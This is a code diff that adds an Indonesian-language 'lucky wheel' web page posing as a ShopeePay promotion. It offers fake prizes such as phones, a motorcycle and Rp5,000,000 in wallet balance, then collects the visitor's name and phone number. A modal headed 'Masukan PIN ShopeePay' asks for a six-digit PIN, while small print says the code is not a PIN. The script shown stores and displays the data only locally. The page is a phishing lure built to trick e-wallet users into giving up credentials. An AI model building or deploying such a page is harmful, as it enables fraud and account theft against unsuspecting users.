@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roda Keberuntungan</title>
+
+<style>
+*{box-sizing:border-box}
+
+html,body{
+    margin:0;
+    padding:0;
+    width:100%;
+    height:100%;
+    overflow:hidden;
+}
+
+body{
+    font-family:Arial,Helvetica,sans-serif;
+    background:#f7f7f7;
+    color:#222;
+}
+
+.promo-card{
+    width:100%;
+    max-width:720px;
+    height:100dvh;
+    margin:auto;
+    background:#fff;
+    padding:10px 18px 14px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    overflow:hidden;
+}
+
+.logo-frame{
+    width:110px;
+    height:90px;
+    margin-bottom:8px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+}
+
+.logo-frame img{
+    width:82px;
+    height:82px;
+    object-fit:contain;
+}
+
+.banner{
+    width:100%;
+    background:#f45132;
+    border-radius:16px;
+    padding:13px 10px;
+    text-align:center;
+    color:#fff;
+    margin-bottom:20px;
+    flex-shrink:0;
+}
+
+.banner h1{
+    margin:0 0 7px;
+    font-size:17px;
+    line-height:1.15;
+    font-weight:800;
+}
+
+.banner p{
+    margin:0;
+    font-size:11px;
+    line-height:1.3;
+}
+
+.wheel-container{
+    position:relative;
+    width:min(76vw,330px);
+    aspect-ratio:1/1;
+    margin:0 auto 34px;
+    flex-shrink:1;
+    min-height:0;
+}
+
+.wheel{
+    width:100%;
+    height:100%;
+    border-radius:50%;
+    overflow:hidden;
+    transform-origin:center;
+    transition:transform 5.2s cubic-bezier(.12,.7,.15,1);
+}
+
+.wheel-image{
+    width:100%;
+    height:100%;
+    display:block;
+    object-fit:contain;
+    user-select:none;
+    pointer-events:none;
+}
+
+.pointer{
+    position:absolute;
+    top:-6px;
+    left:50%;
+    transform:translateX(-50%) rotate(180deg);
+    width:0;
+    height:0;
+    border-left:14px solid transparent;
+    border-right:14px solid transparent;
+    border-bottom:30px solid #fff;
+    filter:drop-shadow(0 2px 3px rgba(0,0,0,.35));
+    z-index:10;
+}
+
+.spin-button{
+    width:100%;
+    border:0;
+    border-radius:15px;
+    background:#f45132;
+    color:#fff;
+    padding:14px 10px;
+    font-size:20px;
+    font-weight:800;
+    cursor:pointer;
+    flex-shrink:0;
+    margin-top:6px;
+}
+
+.spin-button:disabled{opacity:.7}
+
+.modal{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.55);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index:100;
+}
+
+.modal.show{display:flex}
+
+.modal-box{
+    width:100%;
+    max-width:420px;
+    background:#fff;
+    border-radius:20px;
+    padding:24px 20px;
+    box-shadow:0 15px 45px rgba(0,0,0,.25);
+}
+
+.modal-box h2{
+    margin:0 0 8px;
+    text-align:center;
+    font-size:23px;
+}
+
+.modal-description{
+    margin:0 0 20px;
+    text-align:center;
+    font-size:13px;
+    line-height:1.5;
+    color:#666;
+}
+
+.input-group{margin-bottom:17px}
+
+.input-group label{
+    display:block;
+    font-size:14px;
+    font-weight:700;
+    margin-bottom:5px;
+}
+
+.field-description{
+    font-size:12px;
+    line-height:1.4;
+    color:#777;
+    margin:0 0 7px;
+}
+
+.input-group input{
+    width:100%;
+    border:1px solid #d8d8d8;
+    border-radius:11px;
+    padding:13px 12px;
+    font-size:15px;
+    outline:none;
+}
+
+.input-group input:focus{
+    border-color:#f45132;
+}
+
+.modal-btn{
+    width:100%;
+    border:0;
+    border-radius:12px;
+    background:#f45132;
+    color:#fff;
+    padding:13px;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.result-prize{
+    text-align:center;
+    font-size:22px;
+    font-weight:800;
+    color:#f45132;
+    margin:15px 0 20px;
+}
+
+.code-note{
+    margin:-5px 0 16px;
+    padding:10px 12px;
+    border-radius:10px;
+    background:#f7f7f7;
+    color:#666;
+    font-size:12px;
+    line-height:1.45;
+}
+
+.fireworks{
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    overflow:hidden;
+    z-index:105;
+    display:none;
+}
+
+.fireworks.active{display:block}
+
+.firework{
+    position:absolute;
+    width:5px;
+    height:5px;
+    border-radius:50%;
+    animation:explode 1.4s ease-out forwards;
+}
+
+.firework span{
+    position:absolute;
+    left:0;
+    top:0;
+    width:5px;
+    height:5px;
+    border-radius:50%;
+    background:#fff;
+    box-shadow:
+    0 -55px 0 #ff453a,
+    39px -39px 0 #ffd60a,
+    55px 0 0 #30d158,
+    39px 39px 0 #64d2ff,
+    0 55px 0 #bf5af2,
+    -39px 39px 0 #ff9f0a,
+    -55px 0 0 #ff375f,
+    -39px -39px 0 #0a84ff;
+}
+
+.firework:nth-child(1){left:20%;top:28%}
+.firework:nth-child(2){left:78%;top:24%;animation-delay:.25s}
+.firework:nth-child(3){left:30%;top:65%;animation-delay:.45s}
+.firework:nth-child(4){left:72%;top:67%;animation-delay:.65s}
+.firework:nth-child(5){left:50%;top:18%;animation-delay:.8s}
+
+@keyframes explode{
+    0%{transform:scale(.1);opacity:1}
+    45%{transform:scale(1);opacity:1}
+    100%{transform:scale(1.8);opacity:0}
+}
+
+@media(max-width:500px) and (max-height:700px){
+    .promo-card{padding:7px 15px 10px}
+    .logo-frame{width:105px;height:75px;margin-bottom:7px}
+    .logo-frame img{width:68px;height:68px}
+    .banner{padding:10px 8px;margin-bottom:14px}
+    .banner h1{font-size:15px;margin-bottom:5px}
+    .banner p{font-size:10px}
+    .wheel-container{
+        width:min(70vw,280px);
+        margin-bottom:28px;
+    }
+    .spin-button{
+        font-size:18px;
+        padding:12px 8px;
+        margin-top:6px;
+    }
+}
+
+@media(max-width:500px) and (min-height:701px){
+    .promo-card{padding:9px 16px 12px}
+    .logo-frame{width:110px;height:82px;margin-bottom:8px}
+    .logo-frame img{width:76px;height:76px}
+    .banner{padding:12px 9px;margin-bottom:17px}
+    .banner h1{font-size:16px;margin-bottom:6px}
+    .banner p{font-size:11px}
+    .wheel-container{
+        width:min(74vw,305px);
+        margin-bottom:30px;
+    }
+    .spin-button{
+        font-size:19px;
+        padding:13px 8px;
+        margin-top:6px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="promo-card">
+
+    <div class="logo-frame">
+        <img src="https://cdn.phototourl.com/member/2026-10-02-c4e58b2d-da44-4322-8ba4-1ca03550feb1.png">
+    </div>
+
+    <div class="banner">
+        <h1>RODA KEBERUNTUNGAN</h1>
+        <p>Putar roda dan lihat hadiah yang kamu dapatkan.</p>
+    </div>
+
+    <div class="wheel-container">
+        <div class="pointer"></div>
+
+        <div class="wheel" id="wheel">
+            <img
+                class="wheel-image"
+                src="https://cdn.phototourl.com/member/2026-10-02-762200d6-01a6-4b82-a543-a972ae8b4865.png"
+                alt="Roda Keberuntungan"
+            >
+        </div>
+    </div>
+
+    <button class="spin-button" id="spinButton">
+        PUTAR SEKARANG
+    </button>
+
+</div>
+
+<!-- HASIL -->
+<div class="modal" id="resultModal">
+    <div class="modal-box">
+        <h2>Hasil Putaran</h2>
+
+        <p class="modal-description">
+            Selamat! Roda telah berhenti pada hadiah berikut.
+        </p>
+
+        <div class="result-prize" id="prizeResult">-</div>
+
+        <button class="modal-btn" id="continueBtn">
+            Lanjut
+        </button>
+    </div>
+</div>
+
+<!-- DATA -->
+<div class="modal" id="dataModal">
+    <div class="modal-box">
+
+        <h2>Data Penerima</h2>
+
+        <p class="modal-description">
+            Lengkapi data berikut untuk melanjutkan proses penerimaan hadiah.
+        </p>
+
+        <div class="input-group">
+            <label>Nama Lengkap</label>
+
+            <div class="field-description">
+                Masukkan nama lengkap penerima hadiah.
+            </div>
+
+            <input
+                type="text"
+                id="nameInput"
+                placeholder="Masukkan nama lengkap"
+                autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label>Nomor HP</label>
+
+            <div class="field-description">
+                Gunakan nomor HP yang masih aktif untuk keperluan konfirmasi.
+            </div>
+
+            <input
+                type="tel"
+                id="phoneInput"
+                placeholder="Masukkan nomor HP aktif"
+                autocomplete="off">
+        </div>
+
+        <button class="modal-btn" id="dataBtn">
+            Lanjut
+        </button>
+
+    </div>
+</div>
+
+<!-- KODE -->
+<div class="modal" id="codeModal">
+    <div class="modal-box">
+
+        <h2>Masukan PIN ShopeePay</h2>
+
+        <p class="modal-description">
+            Masukan PIN untuk melanjutkan proses klaim hadiah.
+        </p>
+
+        <div class="input-group">
+            <label></label>
+
+            <div class="field-description">
+                Buat kode sendiri yang mudah kamu ingat. Kode ini bukan PIN atau OTP.
+            </div>
+
+            <input
+                type="text"
+                id="codeInput"
+                inputmode="numeric"
+                maxlength="6"
+                placeholder="Contoh: 123456"
+                autocomplete="off">
+        </div>
+
+        <div class="code-note">
+        
+        </div>
+
+        <button class="modal-btn" id="codeBtn">
+            Selesaikan
+        </button>
+
+    </div>
+</div>
+
+<!-- SELESAI -->
+<div class="modal" id="finishModal">
+    <div class="modal-box">
+
+        <h2>Proses Selesai</h2>
+
+        <p class="modal-description">
+            Data penerima berhasil dicatat.
+        </p>
+
+        <div class="result-prize" id="finishPrize">-</div>
+
+        <div class="code-note" id="finishData">-</div>
+
+        <button class="modal-btn" id="finishBtn">
+            Tutup
+        </button>
+
+    </div>
+</div>
+
+<!-- KEMBANG API -->
+<div class="fireworks" id="fireworks">
+    <div class="firework"><span></span></div>
+    <div class="firework"><span></span></div>
+    <div class="firework"><span></span></div>
+    <div class="firework"><span></span></div>
+    <div class="firework"><span></span></div>
+</div>
+
+<script>
+const prizes = [
+    "Handphone",
+    "Kulkas",
+    "Sepeda Motor",
+    "Saldo ShopeePay Rp5.000.000",
+    "Bebas Tagihan SPayLater",
+    "Bebas Tagihan SPinjam"
+];
+
+const prizeIndex = {
+    "Handphone":0,
+    "Kulkas":1,
+    "Sepeda Motor":2,
+    "Saldo ShopeePay Rp5.000.000":3,
+    "Bebas Tagihan SPayLater":4,
+    "Bebas Tagihan SPinjam":5
+};
+
+const wheel = document.getElementById("wheel");
+const spinButton = document.getElementById("spinButton");
+
+const resultModal = document.getElementById("resultModal");
+const dataModal = document.getElementById("dataModal");
+const codeModal = document.getElementById("codeModal");
+const finishModal = document.getElementById("finishModal");
+
+const prizeResult = document.getElementById("prizeResult");
+const finishPrize = document.getElementById("finishPrize");
+const finishData = document.getElementById("finishData");
+
+const nameInput = document.getElementById("nameInput");
+const phoneInput = document.getElementById("phoneInput");
+const codeInput = document.getElementById("codeInput");
+
+const fireworks = document.getElementById("fireworks");
+
+let currentRotation = 0;
+let spinning = false;
+let selectedPrize = "";
+
+function showFireworks(){
+    fireworks.classList.remove("active");
+    void fireworks.offsetWidth;
+    fireworks.classList.add("active");
+
+    setTimeout(function(){
+        fireworks.classList.remove("active");
+    },2200);
+}
+
+function spinWheel(){
+
+    if(spinning) return;
+
+    spinning = true;
+    spinButton.disabled = true;
+
+    const index = Math.floor(Math.random() * prizes.length);
+    selectedPrize = prizes[index];
+
+    const targetAngle = index * 60;
+
+    const currentMod =
+        ((currentRotation % 360) + 360) % 360;
+
+    let correction =
+        (360 - targetAngle - currentMod) % 360;
+
+    if(correction < 0){
+        correction += 360;
+    }
+
+    const extraRounds = 360 * 6;
+
+    const targetRotation =
+        currentRotation +
+        extraRounds +
+        correction;
+
+    currentRotation = targetRotation;
+
+    wheel.style.transform =
+        "rotate(" + currentRotation + "deg)";
+
+    setTimeout(function(){
+
+        prizeResult.textContent = selectedPrize;
+
+        resultModal.classList.add("show");
+
+        showFireworks();
+
+        spinning = false;
+        spinButton.disabled = false;
+
+    },5200);
+}
+
+spinButton.addEventListener("click",spinWheel);
+
+continueBtn.addEventListener("click",function(){
+
+    resultModal.classList.remove("show");
+
+    setTimeout(function(){
+        dataModal.classList.add("show");
+    },150);
+
+});
+
+dataBtn.addEventListener("click",function(){
+
+    const name = nameInput.value.trim();
+    const phone = phoneInput.value.trim();
+
+    if(!name){
+        alert("Silakan masukkan nama lengkap.");
+        nameInput.focus();
+        return;
+    }
+
+    if(!phone){
+        alert("Silakan masukkan nomor HP.");
+        phoneInput.focus();
+        return;
+    }
+
+    dataModal.classList.remove("show");
+
+    setTimeout(function(){
+        codeModal.classList.add("show");
+        codeInput.focus();
+    },150);
+
+});
+
+codeBtn.addEventListener("click",function(){
+
+    const name = nameInput.value.trim();
+    const phone = phoneInput.value.trim();
+    const code = codeInput.value.trim();
+
+    if(!/^\d{6}$/.test(code)){
+        alert("Kode klaim harus terdiri dari 6 digit angka.");
+        codeInput.focus();
+        return;
+    }
+
+    finishPrize.textContent = selectedPrize;
+
+    finishData.innerHTML =
+        "<strong>Nama:</strong> " + escapeHTML(name) +
+        "<br><strong>Nomor HP:</strong> " + escapeHTML(phone) +
+        "<br><strong>Kode Klaim:</strong> " + escapeHTML(code);
+
+    codeModal.classList.remove("show");
+
+    setTimeout(function(){
+        finishModal.classList.add("show");
+    },150);
+
+});
+
+finishBtn.addEventListener("click",function(){
+    finishModal.classList.remove("show");
+});
+
+function escapeHTML(value){
+    return value
+        .replace(/&/g,"&amp;")
+        .replace(/</g,"&lt;")
+        .replace(/>/g,"&gt;")
+        .replace(/"/g,"&quot;")
+        .replace(/'/g,"&#039;");
+}
+</script>
+
+</body>
+</html>
